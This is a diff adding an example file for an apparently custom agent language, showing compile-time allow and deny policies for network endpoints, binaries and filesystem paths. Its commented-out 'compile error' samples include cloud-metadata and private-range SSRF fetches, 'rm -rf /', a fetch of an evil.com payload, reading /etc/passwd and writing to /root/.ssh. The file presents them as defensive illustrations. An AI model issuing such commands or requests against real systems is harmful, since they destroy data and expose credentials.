@@ -1,0 +1,121 @@
+// ============================================================
+// 23_access_control.lceron — Network + Binary Access Control
+// ============================================================
+// Compile-time enforcement inspired by NVIDIA NemoClaw/OpenShell
+// but enforced at the LANGUAGE level, not runtime YAML.
+
+// ── Traditional abstract capability (backward compatible) ──
+capability llm {
+    complete
+    classify requires complete
+}
+
+// ── Concrete network policy ────────────────────────────────
+capability network {
+    allow endpoint "api.github.com:443" {
+        method: [GET, POST]
+        path: "/repos/**"
+    }
+    allow endpoint "api.openai.com:443" {
+        method: [POST]
+        path: "/v1/chat/completions"
+    }
+    deny private_ranges
+    default: deny
+}
+
+// ── Concrete binary policy ─────────────────────────────────
+capability shell {
+    allow binary "/usr/bin/git"
+    allow binary "/usr/bin/curl"
+    deny binary "/bin/rm"
+    deny binary "/bin/sh"
+    default: deny
+}
+
+// ── Concrete filesystem policy ────────────────────────────
+capability filesystem {
+    allow path "/data/**" { mode: [read, write] }
+    allow path "/tmp/**" { mode: [read, write] }
+    allow path "/config/**" { mode: [read] }
+    deny path "/etc/**"
+    deny path "/root/**"
+    deny path "/proc/**"
+    default: deny
+}
+
+// ── Tools with abstract capabilities ───────────────────────
+tool summarize(text: string) -> Result {
+    requires: [llm.complete]
+    description: "Summarize a block of text"
+}
+
+// ── Agent with concrete access policies ────────────────────
+agent Deployer {
+    capabilities: [llm.complete]
+    use network, shell
+    model: "gpt-4"
+    budget: { max_tokens: 50000, max_cost: 5.00, max_duration: 300 }
+    prompt: "You are a deployment agent. You fetch repo data and run git commands."
+
+    fn deploy(repo: string) -> Result {
+        // These are ALLOWED by the access control policies:
+        let data = fetch("https://api.github.com/repos/myorg/myrepo")
+        let status = exec("git status")
+        data
+    }
+
+    fn check_api() -> Result {
+        let r = fetch("https://api.openai.com/v1/chat/completions")
+        r
+    }
+
+    // Uncomment any of these to see COMPILE ERRORS:
+    //
+    // fn bad_ssrf() -> Result {
+    //     fetch("http://10.0.0.1/admin")          // ERROR: private range denied
+    //     fetch("http://169.254.169.254/metadata") // ERROR: private range denied
+    // }
+    //
+    // fn bad_binary() -> Result {
+    //     exec("rm -rf /")              // ERROR: /bin/rm explicitly denied
+    //     exec("sh -c 'echo pwned'")    // ERROR: /bin/sh explicitly denied
+    // }
+    //
+    // fn bad_endpoint() -> Result {
+    //     fetch("https://evil.com/payload")  // ERROR: not in allow list
+    // }
+}
+
+// ── Agent with filesystem access policies ──────────────────
+agent DataProcessor {
+    use filesystem
+    model: "gpt-4"
+    prompt: "You process data files."
+
+    fn process() -> Result {
+        // These are ALLOWED by the filesystem policy:
+        let data = read_file("/data/input.csv")
+        write_file("/tmp/output.txt", data)
+        data
+    }
+
+    // Uncomment to see COMPILE ERRORS:
+    //
+    // fn bad_read() -> Result {
+    //     read_file("/etc/passwd")           // ERROR: path denied
+    // }
+    //
+    // fn bad_write() -> Result {
+    //     write_file("/root/.ssh/keys", "x") // ERROR: path denied
+    // }
+    //
+    // fn bad_default() -> Result {
+    //     read_file("/var/log/syslog")       // ERROR: not in allow list
+    // }
+}
+
+fn main() -> Result {
+    let d = Deployer
+    d.deploy("myorg/myrepo")
+}
